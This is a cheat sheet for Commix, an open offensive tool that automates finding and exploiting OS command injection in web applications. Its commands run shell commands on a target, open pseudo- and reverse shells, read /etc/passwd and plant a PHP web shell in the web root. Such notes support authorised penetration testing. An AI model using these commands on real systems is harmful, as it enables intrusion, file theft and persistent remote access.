---
name: Commix
category: Web & Fuzzing
description: Automated detection and exploitation of OS command injection.
tags: [command-injection, rce, web, exploit, os]
---

# Commix

**Commix** (COMMand Injection eXploiter) automates finding and exploiting **OS command injection** vulnerabilities in web apps — the SQLi-equivalent workflow for command injection, ending in a shell on the target.

> `apt install commix` · [github.com/commixproject/commix](https://github.com/commixproject/commix)

## Basic usage

```bash
commix -u 'https://alvo/page.php?id=1'
commix -u 'https://alvo/ping.php?ip=127.0.0.1' --batch     # non-interactive
commix -u 'https://alvo/page?q=1' -p q                       # target a parameter
```

## POST data, cookies, headers

```bash
commix -u https://alvo/dns.php --data='host=127.0.0.1'
commix -u https://alvo/ --cookie='PHPSESSID=abc'
commix -u https://alvo/ --headers='X-Forwarded-For: 127.0.0.1'
commix -r request.txt                        # from a saved Burp request
```

## Techniques & tuning

```bash
commix -u '...' --technique=classic          # classic, eval-based, time-based, file-based
commix -u '...' --level=3                     # test more injection points (headers, UA, referer)
commix -u '...' --random-agent --proxy=http://127.0.0.1:8080
```

## Getting a shell / actions

```bash
commix -u '...' --os-cmd='id'                # run a single command
commix -u '...' --os-shell                    # interactive pseudo-shell
commix -u '...' --reverse-tcp                  # attempt a reverse shell
commix -u '...' --file-read=/etc/passwd
commix -u '...' --file-write=shell.php --file-dest=/var/www/html/s.php
```

> Great against ping/DNS/lookup features and any input passed to a system command. Feeding a **saved request** (`-r`) captures the full context. Related: [sqlmap](#/tool/sqlmap) for SQLi, [msfconsole](#/tool/msfconsole) for follow-up payloads.
